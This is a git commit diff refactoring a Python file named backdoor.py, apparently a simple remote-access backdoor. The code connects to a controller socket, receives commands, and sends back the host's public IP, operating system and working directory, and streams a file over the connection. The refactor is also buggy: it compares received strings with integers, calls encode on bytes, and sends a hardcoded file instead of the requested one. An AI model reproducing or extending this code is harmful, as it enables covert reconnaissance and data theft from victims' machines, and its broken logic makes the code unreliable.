21c6c9e959bfda11547b240f3562605c458ab3ff
sudopp1290 <sudopp1290@gmail.com>
2026-07-13 20:54:41 +0300

    Refactor command and handle_commands functions
    Refactor backdoor.py to simplify command handling and remove socket parameter.

--- backdoor.py
+++ backdoor.py
@@ -3,36 +3,40 @@ import requests as req
 import os
 import subprocess
 import platform
-
+import json
 connected = True
 def connection():
     HOST = '127.0.0.1'
     PORT = 6654
+    global sock
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
     sock.connect((HOST,PORT))
     return sock
-def commands(command , sock):
-    if command == '1':
-        res_req = req.get('https://api.ipify.org')
-        data_req = res_req.json()
+def commands():
+    if command == 1:
+        res_req = req.get('https://api.ipify.org').text
         Os = platform.platform()
         working_dir = os.getcwd()
-        res = f'{data_req}\n{Os}\n Directory : {working_dir}'
-        resp = sock.sendall(res)
-    elif command == '2':
+        res = f'{res_req}\n{Os}\n Directory : {working_dir}'
+        resp = sock.sendall(res.encode())
+    elif command == 2:
         choice = sock.recv(1024).decode().strip()
         file_size = os.path.getsize(choice)
         sock.sendall(file_size.to_bytes(8, "big"))
         with open("movie.mp4", "rb") as f:
             while chunk := f.read(4096):
-                sock.sendall(chunk)
-def handle_commands(sock):
-    while connected:
+                sock.sendall(chunk.encode())
+def handle_commands():
+    while True:
+        global command
         command = sock.recv(1024).decode().strip()
         return command
 def main():
     sock = connection()
-    while connected:
-        command = handle_commands(sock)
-        commands(command, sock)
+    try:
+        while True:
+            handle_commands()
+            commands()
+    except ConnectionError as e:
+        print(e)
 main()
